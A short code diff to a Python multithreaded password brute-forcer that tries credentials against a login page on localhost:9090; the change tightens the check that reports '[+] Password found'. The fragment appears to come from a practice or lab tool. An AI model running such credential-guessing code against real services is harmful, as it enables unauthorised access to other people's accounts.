@@ -29,7 +29,7 @@ class request_performer(Thread):
         if hit == "1":
             try:
                 r = requests.get(self.url, auth=(self.username, self.password))
-                if r.url !='http://localhost:9090/login.php' :
+                if r.url == 'http://localhost:9090/index.php' and r.status_code == 200:
                     hit = "0"
                     print("[+] Password found -" + colored(self.password, 'green'))
                     sys.exit()
